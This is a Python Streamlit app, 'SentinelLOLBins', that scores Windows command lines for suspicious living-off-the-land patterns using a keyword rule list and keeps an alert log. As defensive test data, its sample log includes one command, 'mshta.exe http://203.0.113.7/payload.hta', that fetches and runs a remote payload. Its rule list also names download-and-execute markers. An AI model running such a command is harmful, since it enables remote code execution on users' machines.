import streamlit as st

st.set_page_config(page_title="SentinelLOLBins", layout="wide")

# ---------- 1. THE RULES ----------
# word to look for  ->  points to add
RULES = {
    "-enc": 50,
    "hidden": 20,
    "http": 30,
    "mshta": 40,
    "users\\public": 45,
    "downloadstring": 30,
}

SAMPLE = "Enter the command here"


# ---------- 2. SCORE ONE COMMAND ----------
def analyse(command):
    score = 5                      # every command starts at 5
    reasons = []                   # the rules that matched

    for word in RULES:
        if word in command.lower():
            score = score + RULES[word]
            reasons.append(word)

    if score > 100:
        score = 100

    if score >= 75:
        risk = "high"
    elif score >= 50:
        risk = "medium"
    else:
        risk = "low"

    return {
        "Risk": risk,
        "Score": score,
        "Command": command,
        "Reasons": ", ".join(reasons),
    }


# ---------- 3. THE ALERT LOG (kept while the page is open) ----------
if "log" not in st.session_state:
    st.session_state["log"] = [
        analyse(SAMPLE),
        analyse("mshta.exe http://203.0.113.7/payload.hta"),
        analyse("powershell.exe Get-ChildItem C:\\Reports"),
    ]


def put_sample_in_box():
    st.session_state["box"] = SAMPLE


# ---------- 4. THE PAGE ----------
st.title("SentinelLOLBins")
left, right = st.columns(2)

# ----- Left: analyse a command -----
with left:
    st.subheader("Command analysis")
    command = st.text_area("Type a command", key="box")

    if st.button("Analyse command", type="primary"):
        if command.strip() == "":
            st.warning("Type a command first.")
        else:
            result = analyse(command.strip())
            st.session_state["log"].insert(0, result)
            st.write("Risk:", result["Risk"], "| Score:", result["Score"])
            st.write("Reasons:", result["Reasons"] or "none")

# ----- Right: the alert log -----
with right:
    st.subheader("Alert log")
    search = st.text_input("Search")
    wanted = st.selectbox("Risk", ["all", "high", "medium", "low"])

    shown = []
    for alert in st.session_state["log"]:
        right_risk = (wanted == "all") or (alert["Risk"] == wanted)
        right_text = search.lower() in alert["Command"].lower()
        if right_risk and right_text:
            shown.append(alert)

    if len(shown) == 0:
        st.info("No alerts match.")
    else:
        st.dataframe(shown, hide_index=True)

# ---------- 5. UPLOAD A FILE ----------
st.subheader("Upload a file")
uploaded = st.file_uploader("One command per line", type=["txt", "log"])

if uploaded is not None:
    new_alerts = []
    for line in uploaded.getvalue().decode("utf-8", errors="ignore").splitlines():
        if line.strip() != "":
            new_alerts.append(analyse(line.strip()))

    st.dataframe(new_alerts, hide_index=True)   

    if st.button("Save to alert log"):
        st.session_state["log"].extend(new_alerts)
        st.success("Saved.")